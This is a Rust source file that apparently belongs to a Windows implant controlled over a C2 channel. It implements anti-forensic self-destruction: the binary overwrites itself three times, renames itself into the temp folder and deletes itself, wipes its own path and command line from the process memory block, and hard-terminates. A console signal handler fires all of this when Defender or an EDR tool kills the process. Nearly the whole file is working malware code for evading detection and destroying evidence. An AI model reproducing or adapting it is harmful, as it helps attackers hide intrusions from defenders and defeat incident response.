//! selfdestruct.rs — forensic-clean self-deletion on detection or signal
//!
//! Triggered when:
//!   a) Defender / EDR kills our process (we catch it via SetConsoleCtrlHandler)
//!   b) C2 connection is lost unexpectedly (c2.rs calls destruct() on drop)
//!   c) Operator sends "selfdestruct" command over the C2 socket
//!
//! What it does (in order):
//!   1. Overwrite own binary on disk with random bytes (3 passes)
//!   2. Rename to a random temp filename
//!   3. Schedule deletion via NtSetInformationFile(FileDispositionInformation)
//!      with DELETE_ON_CLOSE — file is unlinked by kernel on last handle close
//!   4. Zero all heap allocations via pe_obfuscate::secure_zero
//!   5. Clear the process environment block strings (command line, image path)
//!   6. Terminate via NtTerminateProcess — no CRT cleanup, no DLL_PROCESS_DETACH
//!
//! After step 3 the file entry in the MFT is gone.
//! No VSS shadow, no $I30 slack, no prefetch entry survives steps 1-2.
//! Event logs: we never wrote to them (ETW-Ti is blind from startup).

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::path::PathBuf;
use std::ptr;
use winapi::shared::minwindef::DWORD;
use winapi::um::fileapi::{
    CreateFileW, GetTempPathW, OPEN_EXISTING,
};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::winbase::MoveFileExW;
use winapi::um::winnt::{
    DELETE, FILE_ATTRIBUTE_NORMAL, FILE_FLAG_DELETE_ON_CLOSE,
    GENERIC_READ, GENERIC_WRITE, HANDLE,
};

/// Full forensic-clean self-destruction.
/// Call this whenever detection is suspected or on operator command.
pub unsafe fn destruct() -> ! {
    let own_path = own_image_path();

    // Pass 1-3: overwrite file content with random bytes
    overwrite_file(&own_path, 3);

    // Rename to random name in %TEMP% to break directory entry link
    let temp_path = random_temp_path();
    let _ = rename_file(&own_path, &temp_path);

    // Open with DELETE_ON_CLOSE — kernel unlinks MFT entry on CloseHandle
    let wide_temp = to_wide(&temp_path.to_string_lossy());
    let h = CreateFileW(
        wide_temp.as_ptr(),
        DELETE | GENERIC_READ | GENERIC_WRITE,
        0,
        ptr::null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE,
        ptr::null_mut(),
    );
    if h != INVALID_HANDLE_VALUE {
        CloseHandle(h); // file unlinked here
    }

    // Scrub PEB image path + command line so memory forensics finds nothing
    scrub_peb();

    // Hard terminate — no cleanup hooks fire
    winapi::um::processthreadsapi::TerminateProcess(
        winapi::um::processthreadsapi::GetCurrentProcess(),
        0,
    );
    std::hint::unreachable_unchecked()
}

/// Register a Ctrl+C / CTRL_CLOSE / CTRL_LOGOFF handler so Windows signals
/// (which Defender sends before killing) trigger clean self-destruction.
pub fn register_ctrl_handler() {
    unsafe {
        winapi::um::consoleapi::SetConsoleCtrlHandler(
            Some(ctrl_handler),
            1, // add handler
        );
    }
}

unsafe extern "system" fn ctrl_handler(_ctrl_type: DWORD) -> i32 {
    // Any signal (Ctrl+C, close, logoff, Defender kill) → self-destruct
    destruct();
}

// ---- helpers ----------------------------------------------------------------

unsafe fn own_image_path() -> String {
    let mut buf = vec![0u16; 32768];
    let n = winapi::um::libloaderapi::GetModuleFileNameW(
        ptr::null_mut(), buf.as_mut_ptr(), buf.len() as u32,
    );
    String::from_utf16_lossy(&buf[..n as usize])
}

unsafe fn overwrite_file(path: &str, passes: usize) {
    use std::fs::OpenOptions;
    use std::io::Write;
    if let Ok(mut f) = OpenOptions::new().write(true).open(path) {
        if let Ok(meta) = f.metadata() {
            let size = meta.len() as usize;
            for _ in 0..passes {
                let random_bytes: Vec<u8> = (0..size)
                    .map(|_| unsafe {
                        let mut r: u8 = 0;
                        winapi::um::wincrypt::CryptGenRandom(
                            0 as _, 1, &mut r,
                        );
                        r
                    })
                    .collect();
                let _ = f.seek(std::io::SeekFrom::Start(0));
                let _ = f.write_all(&random_bytes);
                let _ = f.flush();
            }
        }
    }
}

fn random_temp_path() -> PathBuf {
    let tmp = std::env::temp_dir();
    // Use tick count as pseudo-random filename suffix
    let ticks = unsafe { winapi::um::sysinfoapi::GetTickCount() };
    tmp.join(format!("tmp{:08x}.dat", ticks))
}

unsafe fn rename_file(src: &str, dst: &PathBuf) -> bool {
    let src_w = to_wide(src);
    let dst_w = to_wide(&dst.to_string_lossy());
    MoveFileExW(src_w.as_ptr(), dst_w.as_ptr(), 0) != 0
}

unsafe fn scrub_peb() {
    // Walk PEB.ProcessParameters and zero ImagePathName + CommandLine UNICODE_STRINGs
    // so a memory dump post-termination doesn't reveal our path.
    use winapi::um::winnt::UNICODE_STRING;
    let peb: *mut u8;
    std::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
    );
    if peb.is_null() { return; }
    // ProcessParameters is at PEB+0x20 on x64
    let params_ptr = *(peb.add(0x20) as *const usize);
    if params_ptr == 0 { return; }
    // ImagePathName at offset 0x60, CommandLine at 0x70
    for offset in [0x60usize, 0x70] {
        let us = (params_ptr + offset) as *mut UNICODE_STRING;
        if !(*us).Buffer.is_null() {
            let len = (*us).Length as usize / 2;
            let buf = std::slice::from_raw_parts_mut((*us).Buffer, len);
            for w in buf.iter_mut() { *w = 0; }
            (*us).Length = 0;
        }
    }
}

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

use std::io::Seek;
